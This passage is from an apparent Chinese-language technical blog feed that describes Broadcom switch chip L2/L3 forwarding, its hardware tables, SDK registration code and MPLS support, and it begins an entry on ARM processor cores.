font-size:12pt">从端口进入交换芯片的包首先检查TAG，对于tagged包，判断是否是802.1p的包，（802.1p的包vid为0），对于untagged的包和802.1p的包，根据系统配置加上tag（这些配置包括：基于MAC的vlan、基于子网的vlan、基于协议的vlan和基于端口的vlan）。经过这一步以后，到交换芯片内部的包都变成802.1Q的tagged包了（vid为1－4094，4095保留），<br></span></p><p><span style="color:#5b9bd5; font-family:幼圆; font-size:12pt">如果<span style="color:#333333">设置了<span style="color:red">ingress过滤<span style="color:#333333">，就会检查本端口是否在该vid对应的VLAN中，对于本端口不在该vid对应的VLAN中的包就丢弃。对于没有设置ingress过滤，或者设置ingress过滤但本端口在该vid对应的VLAN中的包进行STP端口状态检查，对于BPDU以外的包，只有端口处于forwarding状态，才允许包进入。<br></span></span></span></span></p><p><span style="color:#5b9bd5; font-family:幼圆; font-size:12pt">然后<span style="color:#333333">进行<span style="color:red">原MAC地址<span style="color:#333333">检查，以原MAC＋VID的哈希为索引查找<span style="color:red">L2 TABLE<span style="color:#333333">，<br></span></span></span></span></span></span></p><p><span style="color:#5b9bd5; font-family:幼圆; font-size:12pt">如果<span style="color:#333333">没有找到，就把这个表项（原MAC＋VID）以及对应的端口写到<span style="color:red">L2 TABLE<span style="color:#333333">中，这个过程称为<span style="background-color:yellow">MAC地址学习</span>。当然地址学习的方法有很多种，可以是硬件学习，也可以是软件学习，可以根据PORT表中的CMI字段的配置来进行。<br></span></span></span></span></p><p><span style="color:#5b9bd5; font-family:幼圆; font-size:12pt">下一步<span style="color:#333333">进行<span style="color:red">目的MAC地址<span style="color:#333333">检查：目的MAC地址为广播地址（0xffffffff）的包，在vlan内广播出去；目的MAC地址为组播地址的包，进行组播流程的处理；对于单播包，查找<span style="color:red">L2 TABLE<span style="color:#333333">，如果没有找到，就在vlan内进行洪泛；<br></span></span></span></span></span></span></p><p><span style="color:#5b9bd5; font-family:幼圆; font-size:12pt">如果<span style="color:#333333">找到，检查<span style="color:red">表项中的L3 bit<span style="color:#333333">是否设置，<br></span></span></span></span></p><p><span style="color:#5b9bd5; font-family:幼圆; font-size:12pt">如果<span style="color:#333333">设置了L3 bit，就进行L3流程的转发；<br></span></span></p><p><span style="color:#5b9bd5; font-family:幼圆; font-size:12pt">否则<span style="color:#333333">就转发到L2 TABLE表项中的端口去，在egress方向，也有<span style="color:red">egress过滤<span style="color:#333333">设置（默认是使能的），如果<span style="color:red">egress端口<span style="color:#333333">不在vlan中也是不能转发的。<br></span></span></span></span></span></span></p><p><span style="color:#5b9bd5; font-family:幼圆; font-size:12pt">至此<span style="color:#333333">，L2转发流程完成了。<br></span></span></p><p><span style="color:#333333; font-family:幼圆; font-size:12pt">与地址学习相反的过程是地址老化。地址老化的机制是：ASIC内部有个定时器，称为age timer，命令行可以对这个寄存器进行设置，每次查找L2 TABLE时（包括原地址查找和目的地址查找，可以配置），如果命中，就会设置hit标志。当老化时间到后，ASIC把hit标志清除，当下一个老化时间到后，ASIC把hit为0的地址设置为无效，这就是为什么实际地址老化的时间为1～2倍agingTime的原因。<br></span></p><h2 id="2-4-L2转发相关的表项"><a href="#2-4-L2转发相关的表项" class="headerlink" title="2.4 L2转发相关的表项"></a>2.4 L2转发相关的表项</h2><h3 id="2-4-1-port表"><a href="#2-4-1-port表" class="headerlink" title="2.4.1 port表"></a>2.4.1 port表</h3><p><span style="color:#333333; font-size:12pt"><span style="font-family:宋体"> <img src="http://www.madhex.com/wp-content/uploads/2017/03/031517_0647_BCM561513.jpg" alt=""></span><span style="font-family:幼圆"><br>            </span></span></p><p><span style="color:#333333; font-family:幼圆; font-size:12pt">图4 port表<br></span></p><p><span style="color:#333333; font-family:幼圆; font-size:12pt">Port表是一个非常重要的表，有很多与端口相关的控制都在这里设置。每个端口对应一个表项，按端口号进行索引。<br></span></p><p><span style="color:#333333; font-family:幼圆; font-size:12pt">下面介绍一下重要的设置：<br></span></p><p><span style="color:#333333; font-family:幼圆; font-size:12pt">1) PVID            ：设置PORT_VID<br></span></p><p><span style="color:#333333; font-family:幼圆; font-size:12pt">2) 缺省优先级        ：设置PORT_PRI<br></span></p><p><span style="color:#333333; font-family:幼圆; font-size:12pt">3) 流分类使能        ：设置FILTER_ENABLE<br></span></p><p><span style="color:#333333; font-family:幼圆; font-size:12pt">4) VLAN转换使能    ：设置VT_ENABLE和VT_MISS_DROP<br></span></p><p><span style="color:#333333; font-family:幼圆; font-size:12pt">5) Ingress过滤使能：设置EN_IFILTER<br></span></p><p><span style="color:#333333; font-family:幼圆; font-size:12pt">6) 信任COS还是信任DSCP    ：对于IPV4：TRUST_DSCP_V4=0:信任COS；<br></span></p><p><span style="color:#333333; font-family:幼圆; font-size:12pt">TRUST_DSCP_V4=1        : 信任DSCP，对于IPV6：同样设置TRUST_DSCP_V6。<br></span></p><p><span style="color:#333333; font-family:幼圆; font-size:12pt">7) Ingress方向mirror使能：设置MIRROR<br></span></p><p><span style="color:#333333; font-family:幼圆; font-size:12pt">8) MAC地址学习方式        ：设置CML<br></span></p><p><span style="color:#333333; font-family:幼圆; font-size:12pt">9) IP组播是否使用VLAN信息：设置IPMC_DO_VLAN<br></span></p><p><span style="color:#333333; font-family:幼圆; font-size:12pt">10) L3转发使能            ：设置V4L3_ENABLE和V6L3_ENABLE<br></span></p><p><span style="color:#333333; font-family:幼圆; font-size:12pt">11) 是否丢弃BPDU            ：设置DROP_BPDU<br></span></p><p><span style="color:#333333; font-family:幼圆; font-size:12pt">12) 控制是否转发带tag和不带tag的包：设置PORT_DIS_TAG和PORT_DIS_UNTAG<br></span></p><p><span style="color:#333333; font-family:幼圆; font-size:12pt">13) Pause帧控制            ：设置PASS_CONTROL_FRAMES<br></span></p><p><span style="color:#333333; font-family:幼圆; font-size:12pt">14) 基于子网的VLAN使能    ：设置SUBNET_BASED_VID_ENABLE<br></span></p><p><span style="color:#333333; font-family:幼圆; font-size:12pt">15) 基于MAC的VLAN使能    ：设置MAC_BASED_VID_ENABLE<br></span></p><p><span style="color:#333333; font-family:幼圆; font-size:12pt">16) 设置堆叠口            ：HIGIG_PACKET<br></span></p><p><span style="color:#333333; font-family:幼圆; font-size:12pt">17) 设置NNI口            ：NNI_PORT<br></span></p><p><span style="color:#333333; font-family:幼圆; font-size:12pt">18) 修改优先级使能        ：MAP_TAG_PACKET_PRIORITY<br></span></p><p><span style="color:#333333; font-family:幼圆; font-size:12pt">19) 堆叠口modid设置        ：MY_MODID<br></span></p><p><span style="color:#333333; font-family:幼圆; font-size:12pt">20) Out tpid设置            ：OUTER_TPID<br></span></p><p><span style="color:#333333; font-family:幼圆; font-size:12pt">21) 基于MAC和基于子网的VLAN优先级设置：VLAN_PRECEDENCE<br></span></p><p><span style="color:#333333; font-family:幼圆; font-size:12pt">22) 是否允许单臂桥功能    ：PORT_BRIDGE<br></span></p><p><span style="color:#333333; font-family:幼圆; font-size:12pt">23) IP组播位图设置        ：IGNORE_IPMC_L2_BITMAP和IGNORE_IPMC_L3_BITMAP<br></span></p><h3 id="2-4-2-L2地址表"><a href="#2-4-2-L2地址表" class="headerlink" title="2.4.2 L2地址表"></a>2.4.2 L2地址表</h3><p><img src="http://www.madhex.com/wp-content/uploads/2017/03/031517_0647_BCM561514.jpg" alt=""><span style="color:#333333; font-family:幼圆; font-size:12pt"><br>        </span></p><p><span style="color:#333333; font-family:幼圆; font-size:12pt">图6 L2地址表<br></span></p><p><span style="color:#333333; font-family:幼圆; font-size:12pt">56504的L2地址表大小为16K，5630X的L2地址表大小为8K，地址表使用<span style="color:red">MAC+VID<span style="color:#333333">的hash值作为索引查表。实际上56504的L2地址表hash值为4K，每个hash值对应4条地址，这样最多可以保存4条hash冲突的地址。地址表中每个表项都保存了MAC_ADDR和VLAN_ID。MAC学习的时候使用原MAC+VID的hash查表，把表中的MAC+VID与包中的MAC+VID进行比较，如果完全相等，表示找到了。然后看端口（TGID_PORT）是否相等，如果不相等表示地址发生了迁移，<br></span></span></span></p><p><span style="color:#333333; font-family:幼圆; font-size:12pt">对于动态学习的地址需要更新port；如果相等表示命中，更新hit标志。其他几个重要的功能介绍如下：<br></span></p><p><span style="color:#333333; font-family:幼圆; font-size:12pt">1) 设置静态地址        ：STATIC_BIT＝1<br></span></p><p><span style="color:#333333; font-family:幼圆; font-size:12pt">2) <span style="color:red">设置L3转发标志<span style="color:#333333">    ：L3＝1<br></span></span></span></p><p><span style="color:#333333; font-family:幼圆; font-size:12pt">3) 设置本地址的包都转发到CPU去：CPU=1<br></span></p><p><span style="color:#333333; font-family:幼圆; font-size:12pt">4) 设置本地址匹配的包丢弃：SRC_DISCARD=1、DST_DISCARD=1<br></span></p><p><span style="color:#333333; font-family:幼圆; font-size:12pt">5) 设置本地址匹配的包对某些端口阻塞：MAC_BLOCK_INDEX<br></span></p><p><span style="color:#333333; font-family:幼圆; font-size:12pt">6) 设置本地址匹配的包镜像：MIRROR＝1<br></span></p><p><span style="color:#333333; font-family:幼圆; font-size:12pt">7) 设置组播索引：L2MC_PTR<br></span></p><p><span style="color:#333333; font-family:幼圆; font-size:12pt">8) 地址有效标志：VALID＝1<br></span></p><h3 id="2-4-3-VLAN表"><a href="#2-4-3-VLAN表" class="headerlink" title="2.4.3 VLAN表"></a>2.4.3 VLAN表</h3><p><span style="font-family:幼圆; font-size:12pt">Vlan表分为ingress和egress两个部分，分别对应入口控制和出口控制。<br></span></p><p><img src="http://www.madhex.com/wp-content/uploads/2017/03/031517_0647_BCM561515.jpg" alt=""><span style="color:#333333; font-family:幼圆; font-size:12pt"><br>        </span></p><p><span style="color:#333333; font-family:幼圆; font-size:12pt">图7 ingress vlan表<br></span></p><p><span style="color:#333333; font-family:幼圆; font-size:12pt">Ingress Vlan表中主要包含了端口列表，用于ingress filter功能。PFM是用于控制组播洪泛的开关。PFM＝0，组播在vlan内洪泛；PFM＝1，注册的组播按组播表转发，未注册的组播在vlan内洪泛；PFM＝2，注册的组播按组播表转发，未注册的组播丢弃。STG用于标识本vlan所属的生成树组。<br></span></p><p><span style="color:#333333; font-size:12pt"><span style="font-family:宋体"> <img src="http://www.madhex.com/wp-content/uploads/2017/03/031517_0647_BCM561516.jpg" alt=""></span><span style="font-family:幼圆"><br>            </span></span></p><p><span style="color:#333333; font-family:幼圆; font-size:12pt">图8 egress vlan表<br></span></p><p><span style="color:#333333; font-family:幼圆; font-size:12pt">Egress vlan表中除了PFM和STG外，还包含了出口方向的端口位图，以及哪些端口以untag的方式发送本vlan的包。<br></span></p><h3 id="2-4-4-egress-port表"><a href="#2-4-4-egress-port表" class="headerlink" title="2.4.4 egress port表"></a>2.4.4 egress port表</h3><p><span style="color:#333333; font-size:12pt"><span style="font-family:宋体"> <img src="http://www.madhex.com/wp-content/uploads/2017/03/031517_0647_BCM561517.jpg" alt=""></span><span style="font-family:幼圆"><br>            </span></span></p><p><span style="color:#333333; font-family:幼圆; font-size:12pt">图5 egress port表<br></span></p><p><span style="color:#333333; font-family:幼圆; font-size:12pt">EGR_PORT是一组寄存器，每个端口一个，用于EGRESS方向的控制，有几个重要设置介绍如下：<br></span></p><p><span style="color:#333333; font-family:幼圆; font-size:12pt">1) 设置egress端口类型：PORT_TYPE＝0，UNI端口；PORT_TYPE＝1，NNI端口<br></span></p><p><span style="color:#333333; font-family:幼圆; font-size:12pt">2) 设置egress过滤：EN_EFILTER＝1<br></span></p><ol><li><div style="background: #4f81bd"><br><br># L3转发流程<br><br></div></li></ol><p><img src="http://www.madhex.com/wp-content/uploads/2017/03/031517_0647_BCM561518.jpg" alt=""><span style="color:#333333; font-family:幼圆; font-size:12pt"><br>        </span></p><p><span style="color:#333333; font-family:幼圆; font-size:12pt">图9 L3转发流程<br></span></p><p><span style="color:#333333; font-family:幼圆; font-size:12pt">如果查目的MAC地址表的时候发现L3bit置位了，就进入到L3转发流程。与L2交换相比，L3交换可以实现跨VLAN转发，而且它的转发依据不是根据目的MAC地址，而是根据目的IP。<br></span></p><ol><li><h3 id="涉及到的表："><a href="#涉及到的表：" class="headerlink" title="涉及到的表："></a>涉及到的表：</h3></li></ol><p><span style="color:#333333; font-family:幼圆; font-size:12pt"><span style="background-color:yellow">主机路由表</span><br>        </span></p><p><span style="color:#333333; font-family:幼圆; font-size:12pt"><span style="background-color:yellow">子网路由表</span><br>        </span></p><p><span style="color:#333333; font-family:幼圆; font-size:12pt"><span style="background-color:yellow">EGRESS下一跳表</span>        终端设备信息    修改目的信息的依据<br></span></p><p><span style="color:#333333; font-family:幼圆; font-size:12pt"><span style="background-color:yellow">接口表</span>                    交换设备信息    修改源的信息的依据<br></span></p><p><span style="color:#333333; font-family:幼圆; font-size:12pt"><span style="background-color:yellow">INGRESS下一跳表</span>        找到物理端口<br></span></p><ol><li><h3 id="L3转发的流程"><a href="#L3转发的流程" class="headerlink" title="L3转发的流程"></a>L3转发的流程</h3></li></ol><p><span style="color:red; font-family:幼圆; font-size:12pt">第一步: <span style="color:#333333">对L3头部进行校验，校验和错的包直接丢弃；<br></span></span></p><p><span style="color:red; font-family:幼圆; font-size:12pt">第二步: <span style="color:#333333">进行原IP地址查找<br></span></span></p><p><span style="color:#00b0f0"><span style="font-family:幼圆; font-size:12pt">如果<span style="color:#333333"><span style="background-color:yellow">主机路由表</span>中没有找到，会上报给CPU，CPU会进行相应的处理，并更新<span style="background-color:yellow">L3表</span>；（先以源地址查找是想确认下是否有站点漂移的现象和更新<span style="background-color:yellow">L3表</span>。An example of a station movement is when a connection from port 1 is moved to port 2 but the SIP remains the same.</span></span><br>            <span style="color:#333333; font-family:幼圆; font-size:12pt">Unless the software updates the L3 table, packets that are destined to that DIP are forwarded to port 1.）<br></span></span></p><p><span style="color:#333333; font-family:幼圆; font-size:12pt"><br></span></p><p><span style="color:red; font-family:幼圆; font-size:12pt">第三步：<span style="color:#333333">进行目的IP地址查找，<br></span></span></p><p><span style="color:#00b0f0; font-family:幼圆; font-size:12pt">如果<span style="color:#333333"><span style="background-color:yellow">主机路由表</span>中没有找到，就会在<span style="background-color:yellow">子网路由表</span>中进行查找，在子网路由表中进行最长子网匹配的查找算法，如果在<span style="background-color:yellow">子网路由表</span>中还没有找到，则送给CPU进行处理，<br></span></span></p><p><span style="color:#00b0f0; font-family:幼圆; font-size:12pt">如果<span style="color:#333333"><span style="background-color:yellow">主机路由表</span>或<span style="background-color:yellow">子网路由表</span>中找到了，<br></span></span></p><p><span style="color:#333333; font-family:幼圆; font-size:12pt">就会得到<span style="background-color:yellow">INGRESS</span>/<span style="background-color:yellow">EGRESS下一跳的指针</span>NEXT_HOP_INDEX(ING_L3_NEXT_HOP和EGR_L3_NEXT_HOP)。<br></span></p><p><span style="color:#333333; font-family:幼圆; font-size:12pt"><br>            <span style="color:red">注<span style="color:#333333">:经过查看sdk可以发现路由表和EGRESS下一跳表在一个结构体中定义的。<br></span></span></span></p><p><span style="color:#b4c6e7; font-family:幼圆; font-size:12pt">如果<span style="color:#333333">ECMP使能的话，会得到ECMP的指针和ECMP的个数，从而根据hash算法得到一个<span style="background-color:yellow">下一跳指针</span>。<span style="background-color:yellow">下一条表项</span>中包含了下一跳的MAC地址和<span style="background-color:yellow">接口表</span>的索引。<br></span></span></p><p><span style="color:#00b0f0; font-family:幼圆; font-size:12pt">最后<span style="color:#333333">在包转发出去的时候，<br></span></span></p><p><span style="color:#333333; font-family:幼圆; font-size:12pt">用<span style="background-color:yellow">EGRESS下一跳表</span>       查到    <span style="background-color:yellow">目的MAC地址</span>        替换掉包的<span style="background-color:yellow">目的MAC地址</span>。<br></span></p><p><span style="color:#333333; font-family:幼圆; font-size:12pt">用<span style="background-color:yellow">EGRESS下一跳表</span>       查到    <span style="background-color:yellow">接口表</span>。<br></span></p><p><span style="color:#333333; font-family:幼圆; font-size:12pt">用 <span style="background-color:yellow">接口表</span>                查到    <span style="background-color:yellow">接口MAC地址和VLAN</span>替换掉包的<span style="background-color:yellow">原MAC地址和VLAN</span>。<br></span></p><p><span style="color:#333333; font-family:幼圆; font-size:12pt">用<span style="background-color:yellow">INGRESS下一跳表</span>   查到    <span style="background-color:yellow">出端口</span>。<br></span></p><p><span style="color:#333333; font-family:幼圆; font-size:12pt">    注意：通过代码分析，我们的56151并没有用到EGRESS/INGRESS<br></span></p><h2 id="L3有关的几个重要的表介绍"><a href="#L3有关的几个重要的表介绍" class="headerlink" title="L3有关的几个重要的表介绍"></a>L3有关的几个重要的表介绍</h2><ol><li><h3 id="3层主机路由表"><a href="#3层主机路由表" class="headerlink" title="3层主机路由表"></a>3层主机路由表</h3></li></ol><p><span style="font-family:幼圆; font-size:10pt">v4单播：1024<br></span></p><p><span style="font-family:幼圆; font-size:10pt">v4组播：512<br></span></p><p><span style="font-family:幼圆; font-size:10pt">v6单播：512<br></span></p><p><span style="font-family:幼圆; font-size:10pt">v6组播: 256<br></span></p><ol><li><h3 id="3层LPM路由表"><a href="#3层LPM路由表" class="headerlink" title="3层LPM路由表"></a>3层LPM路由表</h3></li></ol><p><span style="font-family:幼圆; font-size:10pt">v4单播: 512<br></span></p><p><span style="font-family:幼圆; font-size:10pt">v6单播: 256<br></span></p><p><span style="font-family:幼圆; font-size:10pt">包含最长前缀匹配IPv4和IPv6子网路由，包括ECMP/ ECMP路由<br></span></p><p><img src="http://www.madhex.com/wp-content/uploads/2017/03/031517_0647_BCM561519.png" alt=""><span style="font-family:幼圆; font-size:10pt"><br>        </span></p><p><img src="http://www.madhex.com/wp-content/uploads/2017/03/031517_0647_BCM5615110.png" alt=""><span style="font-family:幼圆; font-size:10pt"><br>        </span></p><ol><li><h3 id="接口表"><a href="#接口表" class="headerlink" title="接口表"></a>接口表</h3></li></ol><p>a virtual interface corresponding to a particular routed VLAN</p><p>与特殊路由VLAN相对应的虚拟接口</p><p>and has an associated IP address and MAC address</p><p>并且关联IP地址和MAC地址</p><p>作用：包含交换机的接口mac地址，包在转发时替换愿mac地址</p><ol><li><h3 id="EGRESS-下一跳表"><a href="#EGRESS-下一跳表" class="headerlink" title="EGRESS 下一跳表"></a>EGRESS 下一跳表</h3></li></ol><p>作用：包含出接口下一跳的mac地址 </p><p>包在转发时替换目的mac地址</p><pre><code>相当于arp表</code></pre><ol><li><h3 id="INGRESS下一跳表"><a href="#INGRESS下一跳表" class="headerlink" title="INGRESS下一跳表"></a>INGRESS下一跳表</h3></li></ol><p>作用：包含目的端口</p><h2 id="L3有关的几个重要的表详细信息"><a href="#L3有关的几个重要的表详细信息" class="headerlink" title="L3有关的几个重要的表详细信息"></a>L3有关的几个重要的表详细信息</h2><p><img src="http://www.madhex.com/wp-content/uploads/2017/03/031517_0647_BCM5615111.png" alt=""></p><p><img src="http://www.madhex.com/wp-content/uploads/2017/03/031517_0647_BCM5615112.png" alt=""></p><p><span style="color:#333333; font-family:幼圆; font-size:12pt">图10 L3单播主机路由表<br></span></p><p><img src="http://www.madhex.com/wp-content/uploads/2017/03/031517_0647_BCM5615113.png" alt=""><span style="color:#333333; font-family:幼圆; font-size:12pt"><br>        </span></p><p><img src="http://www.madhex.com/wp-content/uploads/2017/03/031517_0647_BCM5615114.png" alt=""><span style="color:#333333; font-family:幼圆; font-size:12pt"><br>        </span></p><p><span style="color:#333333; font-family:幼圆; font-size:12pt">图11 L3子网路由表<br></span></p><p><img src="http://www.madhex.com/wp-content/uploads/2017/03/031517_0647_BCM5615115.png" alt=""><span style="color:#333333; font-family:幼圆; font-size:12pt"><br>        </span></p><p><img src="http://www.madhex.com/wp-content/uploads/2017/03/031517_0647_BCM5615116.png" alt=""><span style="color:#333333; font-family:幼圆; font-size:12pt"><br>        </span></p><p><span style="color:#333333; font-family:幼圆; font-size:12pt">图14 接口表<br></span></p><p><img src="http://www.madhex.com/wp-content/uploads/2017/03/031517_0647_BCM5615117.png" alt=""><span style="color:#333333; font-family:幼圆; font-size:12pt"><br>        </span></p><p><span style="color:#333333; font-family:幼圆; font-size:12pt">图13 EGRESS 下一跳表<br></span></p><p><img src="http://www.madhex.com/wp-content/uploads/2017/03/031517_0647_BCM5615118.png" alt=""><span style="color:#333333; font-family:幼圆; font-size:12pt"><br>        </span></p><p><span style="color:#333333; font-family:幼圆; font-size:12pt">图15 INGRESS 下一跳表<br></span></p><p><img src="http://www.madhex.com/wp-content/uploads/2017/03/031517_0647_BCM5615119.jpg" alt=""><span style="color:#333333; font-family:幼圆; font-size:12pt"><br>        </span></p><p><span style="color:#333333; font-family:幼圆; font-size:12pt">图12 ECMP表<br></span></p><p><img src="http://www.madhex.com/wp-content/uploads/2017/03/031517_0647_BCM5615120.png" alt=""><span style="color:#333333; font-family:幼圆; font-size:12pt"><br>        </span></p><p><span style="color:#333333; font-family:幼圆; font-size:12pt">MPLS相关表<br></span></p><ol><li><div style="background: #4f81bd"><br><br># 特殊数据包上CPU设置<br><br></div></li></ol><p>摘抄：BCM53115的CFP共支持256条规则。这些规则依次保存在物理的TCAM Entry（Ternary Content-Aware Memory）中，索引号0~255。</p><p>设置方法一： 已经封装好的特殊包上cpu接口</p><p>参考igmp：bcm_switch_control_set(ulUnit,bcmSwitchIgmpPktToCpu,FALSE);</p><p>设置方法二：利用策略上cpu</p><pre><code>参考ptp：STATUS bcm_ssp_specified_dstmac_packet_tocpu(bcm_mac_t date,bcm_mac_t mask); </code></pre><p>fdb表初始化默认规则修改：</p><pre><code>参考ptp：STATUS bcm_ssp_ptpd_pdelay_packet_tocpu(void)</code></pre><p>BCM芯片FP原理及相关SDK数据结构介绍</p><p><a href="http://www.dnsnat.com/forum.php?mod=viewthread&amp;tid=1205&amp;fromuid=1" target="_blank" rel="external">http://www.dnsnat.com/forum.php?mod=viewthread&amp;tid=1205&amp;fromuid=1</a></p><p>BCM交换芯片策略路由功能</p><p><a href="http://www.dnsnat.com/forum.php?mod=viewthread&amp;tid=1204&amp;fromuid=1" target="_blank" rel="external">http://www.dnsnat.com/forum.php?mod=viewthread&amp;tid=1204&amp;fromuid=1</a></p><ol><li><div style="background: #4f81bd"><br><br># 代码分析<br><br></div></li></ol><p>UNK可以说是UNP的内核形态，以下可以做UNP框架的参考：</p><p><img src="http://www.madhex.com/wp-content/uploads/2017/03/031517_0647_BCM5615121.png" alt=""></p><p><img src="http://www.madhex.com/wp-content/uploads/2017/03/031517_0647_BCM5615122.png" alt=""></p><p>根据以上框架可以确定开发的重点为SSP的开发。SSP是通过SDK封装的应用接口库。所以还需学习SDK提供的API函数。</p><h2 id="BCM5615提供的SDK中包含的L3-API"><a href="#BCM5615提供的SDK中包含的L3-API" class="headerlink" title="BCM5615提供的SDK中包含的L3 API"></a>BCM5615提供的SDK中包含的L3 API</h2><div><table style="border-collapse:collapse; background: #bfbfbf" border="0"><colgroup><col style="width:501px"></colgroup><tbody valign="top"><tr><td style="padding-left: 7px; padding-right: 7px; border-top:  solid 0.5pt; border-left:  solid 0.5pt; border-bottom:  solid 0.5pt; border-right:  solid 0.5pt"><br><br><span style="font-size:10pt">L3 Ingress Interface APIs</span><br></td></tr><tr><td style="padding-left: 7px; padding-right: 7px; border-top:  none; border-left:  solid 0.5pt; border-bottom:  solid 0.5pt; border-right:  solid 0.5pt"><br><br><span style="font-size:10pt">L3 Egress Table APIs</span><br></td></tr><tr><td style="padding-left: 7px; padding-right: 7px; border-top:  none; border-left:  solid 0.5pt; border-bottom:  solid 0.5pt; border-right:  solid 0.5pt"><br><br><span style="font-size:10pt">L3 VRF</span><br></td></tr><tr><td style="padding-left: 7px; padding-right: 7px; border-top:  none; border-left:  solid 0.5pt; border-bottom:  solid 0.5pt; border-right:  solid 0.5pt"><br><br><span style="font-size:10pt">L3 VRRP</span><br></td></tr><tr><td style="padding-left: 7px; padding-right: 7px; border-top:  none; border-left:  solid 0.5pt; border-bottom:  solid 0.5pt; border-right:  solid 0.5pt"><br><br><span style="font-size:10pt">L3 NAT</span><br></td></tr></tbody></table></div><p>SDK具体可参考：《56XX-PG632-RDS_API_decrypted.pdf》</p><p>SSP代码可参考：[bcmRoute.c][bcmRouteHw.c]</p><h2 id="UNP库的使用"><a href="#UNP库的使用" class="headerlink" title="UNP库的使用"></a>UNP库的使用</h2><p>UNP注册函数</p><p>STATUS mvRouteHwapiInit()</p><p>{</p><pre><code>STATUS rc = UNP_OK;UNP_hwApiModuleReg_t routeHwApiModuleReg;routeHwApiModuleReg.funcPortGet = NULL;routeHwApiModuleReg.funcPortSet = NULL;routeHwApiModuleReg.funcSwitchGet = NULL;routeHwApiModuleReg.funcSwitchSet = mvRouteSwitchValueSet;routeHwApiModuleReg.funcStructGet = NULL;routeHwApiModuleReg.funcStructSet = mvRouteSwitchStructSet;routeHwApiModuleReg.funcStructDel = NULL;rc = UNP_hwapiModuleFuncReg(&amp;amp;routeHwApiModuleReg, UNP_MID_ROUTEMANAGE);return rc;</code></pre><p>}</p><p>使用注册函数    </p><p>UNP_CHECK_ERROR(UNP_hwSwitchValueSet(UNP_HW_VRRPACCESS_ENABLE, ulVrrpEnable));</p><ol><li><div style="background: #4f81bd"><br><br># MPLS相关<br><br></div><h2 id="内核支持"><a href="#内核支持" class="headerlink" title="内核支持"></a>内核支持</h2></li></ol><p>MPLS can be built as a kernel module, or it can be built in a kernel.</p><p>To build MPLS first you need to run:</p><p>$ make menuconfig</p><p>and enable MPLS compiling from:</p><p>Network setup -&gt; Networking options -&gt; MPLS (Experimental)</p><p>If you’re running Debian based system, nice HOW-TO on compiling and installing custom kernel</p><p>can be found here:</p><p><a href="https://help.ubuntu.com/community/Kernel/Compile" target="_blank" rel="external">https://help.ubuntu.com/community/Kernel/Compile</a></p><h2 id="quagga支持"><a href="#quagga支持" class="headerlink" title="quagga支持"></a>quagga支持</h2><p>quagga已经有mpls的分支版本</p><p>–enable-mpls=linux –enable-ldpd</p><p><img src="http://www.madhex.com/wp-content/uploads/2017/03/031517_0647_BCM5615123.png" alt=""></p><h2 id="broadcom支持"><a href="#broadcom支持" class="headerlink" title="broadcom支持"></a>broadcom支持</h2><p>Theory of Operation：没有提到</p><p>Network Switching Software Development Kit Release 6.3.2：</p><p>有相关api说明，并提到StrataXGS III provides MPLS functionality</p><p>临时总结：</p><p>其实路由表等不一定非要下硬件，只是下硬件后转发快了。</p><p>所以可以总结，控制信息有哪些， 路由信息有哪些。</p><p>哪些需要上cpu，哪些不需要上。</p><p>quagga保存的所有信息，和需要接收的所有信息。</p>]]></content>
    
    <summary type="html">
    
      1. # BCM包处理原理 L2转发流程 1. # L2转发流程 对于交换芯片来说，L2转发是一个最基本的功能。 2.1 L2功能主要包括： ingre
    
    </summary>
    
      <category term="EMBEDDED" scheme="http://demonelf.github.io/categories/EMBEDDED/"/>
    
    
  </entry>
  
  <entry>
    <title>ARM内核全解析，从ARM7,ARM9到Cortex-A7,A8,A9,A12,A15到Cortex-A53,A57</title>
    <link href="http://demonelf.github.io/EMBEDDED/ARM%E5%86%85%E6%A0%B8%E5%85%A8%E8%A7%A3%E6%9E%90%EF%BC%8C%E4%BB%8EARM7,ARM9%E5%88%B0Cortex-A7,A8,A9,A12,A15%E5%88%B0Cortex-A53,A57.html"/>
    <id>http://demonelf.github.io/EMBEDDED/ARM内核全解析，从ARM7,ARM9到Cortex-A7,A8,A9,A12,A15到Cortex-A53,A57.html</id>
    <published>2019-08-29T04:18:26.852Z</published>
    <updated>2019-08-29T04:16:30.405Z</updated>
    
    <content type="html"><![CDATA[<p><span style="color:black; font-size:9pt"><span style="font-family:宋体">前不久</span><span style="font-family:Verdana">ARM</span><span style="font-family:宋体">正式宣布推出新款</span><span style="font-family:Verdana">ARMv8</span><span style="font-family:宋体">架构的</span><span style="font-family:Verdana">Cortex-A50</span><span style="font-family:宋体">处理器系列产品，以此来扩大</span><span style="font-family:Verdana">ARM</span><span style="font-family:宋体">在高性能与低功耗领域的领先地位，进一步抢占移动终端市场份额。</span><span style="font-family:Verdana">Cortex-A50</span><span style="font-family:宋体">是继</span><span style="font-family:Verdana">Cortex-A15</span><span style="font-family:宋体">之后的又一重量级产品，将会直接影响到主流</span><span style="font-family:Verdana">PC</span><span style="font-family:宋体">市场的占有率。围绕该话题，我们今天不妨总结一下近几年来手机端较为主流的</span><span style="font-family:Verdana">ARM</span><span style="font-family:宋体">处理器。</span><span style="font-family:Verdana"><br>            </span></span></p><a id="more"></a><p><img src="http://www.madhex.com/wp-content/uploads/2016/07/071316_0234_ARMARM71.jpg" alt=""><span style="color:black; font-family:Verdana; font-size:9pt"><br>        </span></p><p><span style="color:black; font-size:9pt"><span style="font-family:宋体">　　</span><span style="font-family:Verdana"><br>            </span><span style="font-family:宋体">以由高到低的方式来看，</span><span style="font-family:Verdana">ARM</span><span style="font-family:宋体">处理器大体上可以排序为：</span><span style="color:#337fe5"><strong><span style="font-family:Verdana">Cortex-A57</span><span style="font-family:宋体">处理器、</span><span style="font-family:Verdana">Cortex-A53</span><span style="font-family:宋体">处理器、</span><span style="font-family:Verdana">Cortex-A15</span><span style="font-family:宋体">处理器、</span><span style="font-family:Verdana">Cortex-A12</span><span style="font-family:宋体">处理器、</span><span style="font-family:Verdana">Cortex-A9</span><span style="font-family:宋体">处理器、</span><span style="font-family:Verdana">Cortex-A8</span><span style="font-family:宋体">处理器、</span><span style="font-family:Verdana">Cortex-A7</span><span style="font-family:宋体">处理器、</span><span style="font-family:Verdana">Cortex-A5</span><span style="font-family:宋体">处理器、</span><span style="font-family:Verdana">ARM11</span><span style="font-family:宋体">处理器、</span><span style="font-family:Verdana">ARM9</span><span style="font-family:宋体">处理器、</span><span style="font-family:Verdana">ARM7</span></strong><span style="font-family:宋体"><strong>处理器</strong><span style="color:black">，再往低的部分手机产品中基本已经不再使用，这里就不再介绍。</span></span><span style="font-family:Verdana"><br>                </span></span></span></p><p><img src="http://www.madhex.com/wp-content/uploads/2016/07/071316_0234_ARMARM72.jpg" alt=""><span 